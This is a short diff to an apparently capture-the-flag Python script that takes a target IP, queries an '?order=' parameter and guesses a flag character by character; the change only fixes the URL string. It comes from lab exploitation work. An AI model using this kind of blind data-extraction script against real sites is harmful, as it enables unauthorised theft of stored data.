@@ -4,7 +4,7 @@ MACHINE_IP = ""
 if MACHINE_IP == "":
   MACHINE_IP = str(input("Machine IP: "))
 
-url = "http:/MACHINE_IP//?order="
+url = f"http://{MACHINE_IP}//?order="
 
 chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-$!:*&%{}()"
 
@@ -33,4 +33,3 @@ while key:
             print("[-] Data could not be extracted beyond!")
             key = False
     print(f"Flag is: {flag}")
-    
